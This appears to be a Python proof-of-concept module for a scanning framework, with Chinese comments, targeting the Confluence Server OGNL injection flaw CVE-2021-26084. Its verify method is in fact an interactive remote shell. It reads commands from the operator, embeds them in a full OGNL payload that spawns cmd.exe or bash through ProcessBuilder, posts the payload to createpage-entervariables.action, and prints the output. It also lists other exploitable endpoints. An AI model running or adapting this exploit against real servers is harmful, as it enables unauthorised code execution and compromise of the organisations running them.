from datetime import date
from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import error, tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin
import requests
from bs4 import BeautifulSoup
import requests
from requests.packages import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


POC_NAME = "CVE_2021_26084_Confluence_OGNL_injection"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class CVE_2021_26084_Confluence_OGNL_injection(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0053',    # PoC的VID编号
            'vbid': '',
            'Name': 'CVE_2021_26084_Confluence_OGNL_injection',    # PoC名称
            'Author': 'lUc1f3r11',    # PoC作者
            'Create_date': '2021-11-10',    # PoC创建时间
        },

        'vul': {
            'Product': 'Confluence Server Webwork',    # 漏洞所在产品名称
            'Version': '',    # 产品的版本号
            'Type': 'OGNL injection RCE',    # 漏洞类型
            'Severity': 'high',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                An OGNL injection vulnerability exists that would allow an authenticated user, and in some instances unauthenticated user, to execute arbitrary code on a Confluence Server or Data Center instance. 
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-9-1',    # PoC公布时间
        }
    }


    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }

    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息

        session = requests.Session()

        #### Confluence Possible exploit endpoints
        # https://<REDACTED>/users/user-dark-features
        # https://<REDACTED>/login
        # https://<REDACTED>/pages/templates2/viewpagetemplate.action
        # https://<REDACTED>/template/custom/content-editor
        # https://<REDACTED>/templates/editor-preload-container
        # https://<REDACTED>/pages/createpage-entervariables.action 

        url_vuln = target + "/pages/createpage-entervariables.action?SpaceKey=x" # you can change the url here...

        def banner():
            print('---------------------------------------------------------------')
            print('[-] Confluence Server Webwork OGNL injection')
            print('[-] CVE-2021-26084')
            print('[-] https://github.com/FDlucifer')
            print('--------------------------------------------------------------- \n')


        def cmdExec():

            while True:
                try:
                    cmd = input('> ')
                    xpl_url = url_vuln
                    xpl_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36", 
                                "Connection": "close", 
                                "Content-Type": "application/x-www-form-urlencoded", 
                                "Accept-Encoding": "gzip, deflate"}      
                    xpl_data = {"queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022"+cmd+"\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}
                    rawHTML = session.post(xpl_url, headers=xpl_headers, data=xpl_data, verify=False)

                    soup = BeautifulSoup(rawHTML.text, 'html.parser')
                    queryStringValue = soup.find('input',attrs = {'name':'queryString', 'type':'hidden'})['value']
                    print("[+] commands execute results: ", queryStringValue)

                    if rawHTML.status_code == 200 and "aaaaaaaa" in str(queryStringValue):
                        self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
                        self.scan_info['Ret']['VerifyInfo']['URL'] = url_vuln    # 记录漏洞相关的一些额外信息（可选）
                        self.scan_info['Ret']['VerifyInfo']['DATA'] = rawHTML.text
                        if verbose:
                            highlight("[+] url: " + url_vuln + " 存在CVE-2021-26084 - Confluence Server Webwork OGNL injection漏洞！！！")
                except:
                    if verbose:
                        highlight("[+] url: " + url_vuln + " 不存在CVE-2021-26084 - Confluence Server Webwork OGNL injection漏洞！！！")
        banner()
        cmdExec()
    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)